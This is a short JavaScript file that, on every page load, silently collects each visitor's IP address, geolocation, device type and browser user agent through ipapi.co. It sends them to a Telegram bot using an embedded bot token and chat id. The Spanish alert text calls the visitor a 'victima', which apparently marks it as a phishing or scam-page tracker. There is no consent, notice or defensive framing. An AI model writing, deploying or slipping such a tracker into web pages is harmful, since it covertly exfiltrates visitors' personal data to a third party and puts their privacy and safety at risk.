window.onload = function () {
  const token = "7853861766:AAEWsNa63E_ANlM6Tq3irTk697hLyBMW5k8";
  const chat_id = "-4673459999";

  fetch("https://ipapi.co/json/")
    .then((res) => res.json())
    .then((data) => {
      const ip = data.ip;
      const ciudad = data.city;
      const region = data.region;
      const pais = data.country_name;
      const ua = navigator.userAgent;
      const dispositivo = /Mobile|Android|iPhone|iPad/i.test(ua)
        ? "📱 Móvil"
        : "💻 PC/Laptop";

      const mensaje = `🍀 ADS victima a la web\n🌐 IP: ${ip}\n📍 Ciudad: ${ciudad}, ${region}, ${pais}\n${dispositivo}\n🧾 Navegador: ${ua}\n🕓 Hora: ${new Date().toLocaleString()}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chat_id,
          text: mensaje,
        }),
      });
    });
};

